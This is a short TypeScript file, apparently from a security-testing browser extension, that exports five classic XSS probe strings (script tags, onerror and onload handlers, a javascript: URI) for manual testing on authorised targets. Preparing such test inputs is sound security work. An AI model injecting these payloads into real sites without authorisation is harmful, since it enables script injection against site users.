/**
 * Strings de exemplo para testes manuais de XSS (nunca executadas pela extensão).
 * Use apenas em alvos autorizados.
 */
export const XSS_MANUAL_HINTS: readonly string[] = [
  String.raw`<script>alert(document.domain)</script>`,
  String.raw`"><img src=x onerror=alert(1)>`,
  String.raw`'-alert(1)-'`,
  String.raw`javascript:alert(1)`,
  String.raw`<svg onload=alert(1)>`,
];
